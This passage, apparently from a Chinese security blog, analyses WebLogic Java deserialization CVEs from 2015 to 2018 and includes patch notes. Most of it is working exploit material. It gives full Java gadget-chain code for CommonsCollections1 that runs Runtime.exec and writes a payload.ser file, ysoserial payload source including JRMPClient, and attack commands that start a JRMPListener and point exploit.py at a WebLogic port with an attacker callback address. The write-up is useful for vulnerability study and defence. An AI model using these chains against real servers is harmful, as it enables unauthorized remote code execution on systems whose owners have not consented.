<p>以<code>TransformedMap</code>为例，在<code>AnnotationInvocationHandler</code>类中，我们可以发现<code>memberValues</code>的类型为<code>Map&lt;String, Object&gt;</code>，我们可以控制其类型为<code>TransformedMap</code>，然后<code>readObject()</code>方法的方法中，我们可以看到<code>entrySet</code>调用了<code>setValue()</code>方法，满足利用条件</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271435a1f8cd7abec091ddbb24.png" alt="image-20210124182703110"></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271435b5a259cd2d0a4f07dfb2.png" alt="image-20210124182534426"></p>
<blockquote>
<p>这里有一处小细节就是，为了让var7非空，我们需要执行<code>innerMap.put(&quot;value&quot;, &quot;value&quot;);</code>，原因是我们的var3的值为[“value”] &#x3D;&gt; “class java.lang.annotaion.RetentionPolicy”，即只有一个”value”的key值，具体可自行去参考它的实现</p>
</blockquote>
<p>这里给出代码实现</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollection1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//Runtime.getRuntime().exec(&quot;calc&quot;); </span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                String.class, Class[].class</span><br><span class="line">                    &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]</span><br><span class="line">            &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                Object.class, Object[].class</span><br><span class="line">                    &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                <span class="literal">null</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]</span><br><span class="line">            &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                String.class</span><br><span class="line">                    &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                <span class="string">&quot;calc&quot;</span></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//只需要有一处调用 chainedTransformer </span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">inMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        inMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outMap</span> <span class="operator">=</span> TransformedMap.decorate(inMap, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">ctor</span> <span class="operator">=</span> cls.getDeclaredConstructor(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">            Class.class, Map.class</span><br><span class="line">        &#125;);</span><br><span class="line">        ctor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">instance</span> <span class="operator">=</span> ctor.newInstance(<span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">            Retention.class, outMap</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 写出到文件</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;payload.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        oos.writeObject(instance);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">// 模拟触发代码执行 </span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;payload.ser&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">newObj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以<code>LazyMap</code>为例，触发点在调用<code>memerValues.entrySet()</code>时会触发它的<code>invoke()</code>方法，其中存在<code>get()</code>方法满足利用条件</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714358835f39a30b4f5a8bb38.png" alt="image-20210124192432215"></p>
<p>代码的实现参考ysoserial的</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Gadgets;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.JavaVersion;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="meta">@PayloadTest(precondition = &quot;isApplicableJavaVersion&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies(&#123;</span></span><br><span class="line"><span class="meta">    &quot;commons-collections:commons-collections:3.1&quot;</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="meta">@Authors(&#123;</span></span><br><span class="line"><span class="meta">    &quot;frohoff&quot;</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections1</span></span><br><span class="line">	<span class="keyword">extends</span> <span class="title class_">PayloadRunner</span></span><br><span class="line">	<span class="keyword">implements</span> <span class="title class_">ObjectPayload</span> &lt; InvocationHandler &gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> InvocationHandler <span class="title function_">getObject</span><span class="params">(String command)</span></span><br><span class="line">    <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String[] execArgs = &#123;</span><br><span class="line">            command</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Integer.valueOf(<span class="number">1</span>))</span><br><span class="line">        &#125;);</span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                String.class, Class[].class</span><br><span class="line">            &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]</span><br><span class="line">            &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                Object.class, Object[].class</span><br><span class="line">            &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                <span class="literal">null</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]</span><br><span class="line">            &#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                String.class</span><br><span class="line">            &#125;, execArgs),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Integer.valueOf(<span class="number">1</span>))</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapProxy</span> <span class="operator">=</span> (Map) Gadgets.createMemoitizedProxy(lazyMap, Map.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> Gadgets.createMemoizedInvocationHandler(mapProxy);</span><br><span class="line">        Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line">        <span class="keyword">return</span> handler;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span></span><br><span class="line">    <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        PayloadRunner.run(CommonsCollections1.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isApplicableJavaVersion</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> JavaVersion.isAnnInvHUniversalMethodImpl();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>补丁</strong></p>
<p>增加<code>ClassFilter.isBlackListed()</code>函数并把涉及到的3个类加入到黑名单</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">weblogic.rjvm.InboundMsgAbbrev.class::ServerChannelInputStream</span><br><span class="line">weblogic.rjvm.MsgAbbrevInputStream.class</span><br><span class="line">weblogic.iiop.Utils.class</span><br></pre></td></tr></table></figure>



<h4 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h4><p><strong>工具利用</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/5up3rc/weblogic_cmd">https://github.com/5up3rc/weblogic_cmd</a></p>
<p>IDEA创建application配置，在Program arguments填入，或者导出.jar</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-H &quot;127.0.0.1&quot; -C &quot;touch /tmp/success&quot; -B -os linux</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>此漏洞是对CVE-2015-4852的黑名单进行绕过，对整个利用链再加一层封装即可绕过黑名单，新的利用点在<code>weblogic.jms.common.StreamMessageImpl</code>类中的<code>readExternal()</code>方法把传入的序列化数据，调用到上面CVE-2015-4852提到的<code>readObject()</code>的方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714353df5a7a5d2ddf1caaef7.png" alt="image-20210125161308443"></p>
<p>所以exploit的写法就是把<code>CommonsCollections1</code>的实现再套一层<code>StreamMessageImpl</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202102021356fb595eb0794698ec7722.png" alt="image-20210127205403637"></p>
<p><strong>补丁</strong></p>
<p>把涉及类加入到黑名单</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weblogic.jms.common.StreamMessageImpl</span><br></pre></td></tr></table></figure>



<h4 id="CVE-2016-3510"><a href="#CVE-2016-3510" class="headerlink" title="CVE-2016-3510"></a>CVE-2016-3510</h4><blockquote>
<p>Oracle WebLogic Server 10.3.6.0、12.1.2.0、12.1.3.0、12.2.1.0</p>
</blockquote>
<p><strong>工具利用</strong></p>
<p><a target="_blank" rel="noopener" href="https://github.com/5up3rc/weblogic_cmd">https://github.com/5up3rc/weblogic_cmd</a></p>
<p>修改TYPE如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">TYPE</span> <span class="operator">=</span> <span class="string">&quot;marshall&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714356a85e15315bcd21561f5.png" alt="image-20210125163013383"></p>
<p><strong>漏洞分析</strong></p>
<p>这个CVE也是对CVE-2015-4852的黑名单进行绕过，利用到的类是<code>weblogic.corba.utils.MarshalledObject</code>类，在反序列化这个类的时候会调用<code>readResolve()</code>方法，里面也调用了ObjectInputStream的<code>readObject()</code>方法</p>
<p><code>MarshalledObject</code>在构造时把参数<code>var1</code>传到<code>this.objBytes</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271436987d24cd4e9b48d1de9b.png" alt="image-20210125163953194"></p>
<p>在调用<code>readResolve()</code>方法时会触发<code>readObject()</code>函数</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271436a8b136590b4722202792.png" alt="image-20210125164049349"></p>
<p>同理exploit的写法是把<code>CommonsCollections1</code>的实现再套一层<code>MarshalledObject</code></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021020213564684f54ab2b300cdfcdd.png" alt="image-20210127205454949"></p>
<p><strong>补丁</strong></p>
<p>把涉及类加入到黑名单</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weblogic.corba.utils.MarshalledObject</span><br></pre></td></tr></table></figure>



<h4 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h4><blockquote>
<p>Oracle WebLogic Server 10.3.6.0、12.1.2.0、12.1.3.0、12.2.1.0</p>
</blockquote>
<p><strong>poc</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections1 &#x27;touch /tmp/success&#x27;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/44553">攻击脚本</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exploit.py 127.0.0.1 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 172.25.144.219 7777 JRMPClient</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// JRMPClient</span></span><br><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.ObjID;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.LiveRef;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.transport.tcp.TCPEndpoint;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">    <span class="string">&quot;restriction&quot;</span></span><br><span class="line">&#125; )</span><br><span class="line"><span class="meta">@PayloadTest( harness = &quot;ysoserial.payloads.JRMPReverseConnectSMTest&quot;)</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.MBECHLER &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JRMPClient</span> <span class="keyword">extends</span> <span class="title class_">PayloadRunner</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Registry&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Registry <span class="title function_">getObject</span> <span class="params">( <span class="keyword">final</span> String command )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        String host;</span><br><span class="line">        <span class="type">int</span> port;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">            host = command;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">            port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TCPEndpoint</span>(host, port);</span><br><span class="line">        <span class="type">UnicastRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(id, te, <span class="literal">false</span>));</span><br><span class="line">        <span class="type">RemoteObjectInvocationHandler</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(ref);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">proxy</span> <span class="operator">=</span> (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">            Registry.class</span><br><span class="line">        &#125;, obj);</span><br><span class="line">        <span class="keyword">return</span> proxy;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">( <span class="keyword">final</span> String[] args )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Thread.currentThread().setContextClassLoader(JRMPClient.class.getClassLoader());</span><br><span class="line">        PayloadRunner.run(JRMPClient.class, args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>这里其实利用到了RMI和DGC的机制，当<strong>DGC Client</strong>调用远程对象时，会调用<strong>DGC Server</strong>的<code>dirty()</code>函数，这时<strong>DGC Server</strong>就向<strong>DGC Client</strong>返回一个<code>lease(DGCClient.vmid, DGCClient.leaseValue)</code>；当<strong>DGC Client</strong>不需要这个远程对象时，就会调用<strong>DGC Server</strong>的<code>clean()</code>函数，这个漏洞的关键点就在于我们可以伪造恶意的DGC Server向<strong>DGC Client</strong>，即victim，回送一个包含恶意payload的对象，让<strong>DGC Client</strong>在DGC层执行反序列化触发payload</p>
<p>漏洞链如下</p>
<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271436405b059050f3937f636e.png" alt="image-20210126142905037" style="zoom:67%;" />

<p><strong>补丁</strong></p>
<p>在<code>resolveProxyClass()</code>方法中加入对<code>java.rmi.registry.Registry</code>的检查</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveProxyClass(String[] interfaces) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    String[] arr$ = interfaces;</span><br><span class="line">    <span class="type">int</span> <span class="variable">len$</span> <span class="operator">=</span> interfaces.length;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i$</span> <span class="operator">=</span> <span class="number">0</span>; i$ &lt; len$; ++i$) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">intf</span> <span class="operator">=</span> arr$[i$];</span><br><span class="line">        <span class="keyword">if</span>(intf.equals(<span class="string">&quot;java.rmi.registry.Registry&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Unauthorized proxy deserialization&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.resolveProxyClass(interfaces);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="CVE-2018-2628"><a href="#CVE-2018-2628" class="headerlink" title="CVE-2018-2628"></a>CVE-2018-2628</h4><blockquote>
<p>Oracle WebLogic Server 10.3.6.0、12.1.3.0、12.2.1.2、12.2.1.3</p>
</blockquote>
<p><strong>poc</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 7777 CommonsCollections1 &#x27;touch /tmp/success&#x27;</span><br></pre></td></tr></table></figure>

